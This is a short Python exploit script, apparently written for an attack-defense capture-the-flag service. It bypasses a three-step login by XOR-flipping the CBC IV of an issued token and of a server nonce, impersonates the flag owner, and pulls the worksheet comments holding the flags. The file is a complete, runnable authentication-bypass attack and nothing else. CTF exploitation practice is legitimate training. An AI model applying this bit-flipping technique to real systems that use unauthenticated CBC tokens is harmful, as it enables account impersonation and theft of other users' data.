import sys
import chall
import random
import string
import json

from requests import RequestException

def die(msg):
    print(msg)
    exit(1)

def rand_str() -> str:
    return ''.join(random.choices(string.ascii_letters + string.digits, k=10))

def xor(a,b):
    return bytes([x^y for x,y in zip(a,b)])

def exploit(ip, flag_id):
    flag_id = json.loads(flag_id)
    ch = chall.Challenge(f'{ip}:8000')
    username = flag_id["owner_name"] # change when it becomes a json
    worksheet_id = flag_id["worksheet_id"]

    try:
        ans1 = ch.login_first(username)
    except RequestException as e:
        die('Could not login first ' + str(e))
    ct = bytes.fromhex(ans1['token'])
    iv = ct[:16]
    ct = ct[16:]
    iv1 = xor(iv, b"A"*16)

    payload = iv1 + ct

    try:
        server_nonce = bytes.fromhex(ch.login_second(payload.hex())['nonce'])
    except RequestException as e:
        die('Could not login second ' + str(e))
    block0 = server_nonce[:16]
    payload = xor(block0, b"A"*16) + server_nonce[16:]

    try:
        ch.login_third(payload.hex())
    except RequestException as e:
        die('Could not login third ' + str(e))

    try:
        w = ch.get_worksheet(worksheet_id)
    except RequestException as e:
        die('Could not get worksheet' + str(e))

    flags = ""
    for comment in w['comments']:
        try:
            flags += comment['content']
        except:
            pass
    return flags

if __name__ == "__main__":
    ip = sys.argv[1]
    flag_id = sys.argv[2]
    print(exploit(ip, flag_id))